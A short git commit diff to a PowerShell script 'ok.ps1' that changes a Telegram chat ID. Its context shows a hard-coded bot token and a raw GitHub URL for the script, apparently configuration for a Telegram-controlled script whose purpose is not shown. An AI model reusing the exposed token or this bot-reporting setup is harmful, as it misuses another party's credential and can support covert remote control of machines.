4918e7dca4676f3b3bf78da19743e5030a1d1c34
Flaawerr <77388149+Flaawerr@users.noreply.github.com>
2023-09-17 01:56:10 +0200

    Update ok.ps1

--- ok.ps1
+++ ok.ps1
@@ -19,7 +19,7 @@ BOT TELEGRAM:
 ############
 
 $BotToken = "6589605286:AAEtW6QqQA7b0BZnESog13y6NAY-XeG3e34"
-$ChatID = '6589605286'
+$ChatID = '-4037601640'
 $githubScript = 'https://raw.githubusercontent.com/Flaawerr/test/main/ok.ps1'
 
 
